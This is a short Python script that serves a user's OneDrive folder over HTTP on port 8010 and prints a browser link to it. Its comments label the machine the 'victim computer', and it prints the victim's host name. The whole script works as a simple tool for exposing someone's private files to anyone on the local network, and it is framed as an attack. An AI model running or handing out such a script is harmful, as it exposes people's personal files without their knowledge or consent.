# for implementing the HTTP Web servers
import http.server

# provides access to the BSD socket interface
import socket

# a framework for network servers
import socketserver

# to access operating system control
import os

# assigning the appropriate port value
PORT = 8010
HOST = socket.gethostbyname(socket.gethostname())
# This finds the name of the computer user
victimname = socket.gethostname()
print(f'Name of the victim computer is: {victimname}')
# x = os.environ['USERPROFILE']

# changing the directory to access the files desktop
# with the help of os module
desktop = os.path.join(os.path.join(os.environ['USERPROFILE']),'OneDrive')
os.chdir(desktop)

# creating a http request
Handler = http.server.SimpleHTTPRequestHandler
# returns, host name of the system under
# which Python interpreter is executed

# finding the IP address of the PC
server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server.connect(("8.8.8.8", 80))
link = "http://" + server.getsockname()[0] + ":" + str(PORT)

# Creating the HTTP request and serving the

# continuous stream of data between client and server
with socketserver.TCPServer(("", PORT), Handler) as httpd:
# folder in the PORT 8010,and the pyqrcode is generated
	print("serving at port", PORT)
	print("Type this in your Browser", link)
	httpd.serve_forever()
